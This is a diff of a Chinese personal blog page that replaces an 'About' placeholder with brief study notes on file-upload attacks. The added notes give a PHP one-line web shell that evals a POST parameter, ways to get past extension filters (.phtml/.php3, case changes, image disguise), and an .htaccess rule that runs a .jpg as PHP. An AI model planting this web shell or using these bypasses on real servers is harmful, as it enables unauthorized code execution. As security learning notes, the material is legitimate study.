@@ -3,7 +3,7 @@
 <html lang="zh-CN">
     <head>
         <meta charset="UTF-8" />
-        <title>About | 遗世独立の幻想乡</title>
+        <title>文件上传 | 遗世独立の幻想乡</title>
         <meta name="author" content="CloudFlowing" />
         <meta name="description" content="" />
         <meta name="keywords" content="" />
@@ -20,6 +20,10 @@
 
 
 <script src="/blog/js/lib/preview.js"></script>
+
+
+
+
 
 
 
@@ -140,22 +144,80 @@
 
                 <div class="article">
     <div>
-        <h1>About</h1>
+        <h1>文件上传</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2023/3/14
+            2023/3/16
         </span>
         
+        <span class="category">
+            <a href="/blog/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                学习笔记
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Web/" style="color: #00bcd4">Web</a>
+            </span>
+            
+        </span>
         
     </div>
     
     <div class="content" v-pre>
-        <h1 id="待施工，博主是个鸽子"><a href="#待施工，博主是个鸽子" class="headerlink" title="待施工，博主是个鸽子"></a>待施工，博主是个鸽子</h1><h2 id="咕，咕，咕"><a href="#咕，咕，咕" class="headerlink" title="咕，咕，咕"></a>咕，咕，咕</h2>
+        <h1 id="文件上传upload"><a href="#文件上传upload" class="headerlink" title="文件上传upload"></a>文件上传upload</h1><span id="more"></span>
+
+<ul>
+<li><p>php写一句话木马上传</p>
+<pre><code class="php">&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;
+</code></pre>
+<ul>
+<li>PHP环境下若php被过滤且无提示，传入**.phtml&#x2F;.php3&#x2F;.php4**的一句话木马（可当作php解析）</li>
+<li>要求传图片，可写入一句话木马改成图片格式，上传时改成.php</li>
+<li>php过滤可尝试改成Php</li>
+</ul>
+</li>
+<li><p>php写&lt;?php phpinfo();?&gt;直接上传</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mmzkyl/article/details/112138834">.htaccess</a>(环境为Apache时使用)</p>
+<pre><code class="htaccess">&lt;FilesMatch &quot;1.jpg&quot;&gt;
+
+Sethandler application/x-httpd-php
+#&lt;!-- 将匹配到的 1.jpg 文件按照php解析执行 --&gt;
+
+Addhandler php5-script .jpg
+#&lt;!-- 将匹配到的 1.jpg 文件按照php解析执行 --&gt;
+
+&lt;/FilesMatch&gt;
+#&lt;!-- 该种匹配方式较为精准，不会造成大批的误伤情况 --&gt;
+</code></pre>
+<ul>
+<li>记得改Content-Type</li>
+</ul>
+</li>
+</ul>
+<hr>
+
     </div>
+    
+    
+    
+    
+    
     
     
 </div>
@@ -189,6 +251,12 @@
             
         </div>
         <script src="/blog/js/main.js"></script>
+        
+        
+
+
+
+
          
     <script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
